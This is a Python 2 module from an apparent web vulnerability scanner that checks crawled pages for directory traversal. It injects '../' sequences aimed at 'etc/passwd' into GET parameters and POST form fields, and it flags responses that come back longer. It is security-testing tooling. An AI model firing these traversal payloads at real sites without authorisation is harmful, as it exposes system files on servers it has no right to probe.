from crawler import Crawler
from generator import ExploitGenerator

import httplib2, urllib, urllib2
from BeautifulSoup import BeautifulSoup, SoupStrainer
from urlparse import urljoin, urlparse
from helper import has_form, parse_form, get_form_action, post_request, create_get_params, create_post_params
from sets import Set

EXPLOIT_PATH = "exploits/"
EXPLOIT_TYPE = "dt"
EXPLOIT_CLASS = "Directory Traversal"


class DTModule:
    """
    DT Module
    Checks for Directory Traversal vulnerability
    """

    def __init__(self, url, pages):
        self.url = url
        self.pages = pages
        self.logs = {}
        
    def log_results(self, results, category):
        log = {}
        log["class"] = category
        log["results"] = {}
        processed_results = []
        for result in results:
            processed_result = {}
            processed_result["endpoint"] = result[0]
            processed_result["params"] = result[1]
            processed_result["method"] = result[2]
            processed_results.append(processed_result)
        log["results"][self.url] = processed_results
        return log

    def retrieve_params(self, params):
        result = []
        split = params.split("&")
        for x in split:
            param = x.split("=")
            result.append(param[0])

        return result

    def prepare_params(self, extracted, depth, file):
        params = self.retrieve_params(extracted)
        paths = self.prepare_paths(depth, file)

        results = []
        combined = ""
        for path in paths:
            for y in params:
                combined = y + "=" + path + "&"
            results.append(combined.rstrip("&"))
        return results

    def prepare_paths(self, depth, file):
        path = "./"
        paths = []
        for x in range(1, depth):
            path += "../" 
            test = path + file
            paths.append(test)
        return paths


    def in_cache(self, cache, string):
        result = False
        for x in cache:
            if str(x) == str(string):
                result = True
        return result
        
    def scan(self):
    
        results = []
        cache = []

        for web_page in self.pages:
            http = httplib2.Http()
            status, response = http.request(web_page)
            parsed = urlparse(web_page)

            # handle scan for get params
            if parsed.query:
                # print("testing page: " + web_page)
                payloads = self.prepare_params(parsed.query, 30, "etc/passwd")
                
                for payload in payloads:
                    url = parsed.scheme + "://" + parsed.hostname + parsed.path + "?" + payload
                    new_status, new_response = http.request(url)

                    if new_status.status == 200:
                        if int(new_status['content-length']) > int(status['content-length']):
                            # print("vulnerable url: " + url + "\n")
                            if not self.in_cache(cache, url):
                                results.append((urlparse(url).path, create_get_params(url), "GET"))
                                cache.append(url)
                                break  
                            break

            # handle scan for post php forms
            if has_form(response):
                forms = parse_form(response)
                action = get_form_action(response)

                if action != None:
                    web_page = web_page.rsplit('/', 1)[0] + "/" + action

                original_response = post_request(web_page, forms)
                injection_forms = []
                paths = self.prepare_paths(30, "etc/passwd")

                for path in paths:
                    for form_input in forms:
                        injection_forms.append((form_input[0], path))

                    new_response = post_request(web_page, injection_forms)
                    if len(new_response) > len(original_response): # That means that the webpage is different, possibly a successful case
                        results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
                        break
          
        self.logs = self.log_results(results, EXPLOIT_CLASS)